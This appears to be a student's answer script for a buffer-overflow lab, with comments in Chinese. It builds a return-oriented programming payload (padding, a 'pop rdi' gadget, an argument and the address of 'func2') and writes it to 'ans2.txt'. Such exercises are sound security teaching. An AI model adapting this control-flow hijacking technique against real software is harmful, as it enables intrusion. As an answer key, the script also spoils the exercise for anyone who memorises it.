padding = b"A" * 8  # 覆盖从rbp-8到rbp的8字节
saved_rbp = b"B" * 8  # 覆盖保存的rbp（可以是任意值）

# ROP链：
# 1. 返回地址：pop_rdi gadget (0x4012c7) - pop %rdi; ret
pop_rdi_gadget = b"\xc7\x12\x40\x00\x00\x00\x00\x00"  # 0x4012c7

# 2. func2的参数：0x3f8（64位，小端序）
func2_arg = b"\xf8\x03\x00\x00\x00\x00\x00\x00"  # 0x00000000000003f8

# 3. func2函数地址
func2_address = b"\x16\x12\x40\x00\x00\x00\x00\x00"  # 0x401216

payload = padding + saved_rbp + pop_rdi_gadget + func2_arg + func2_address

# 将payload写入文件
with open("ans2.txt", "wb") as f:
    f.write(payload)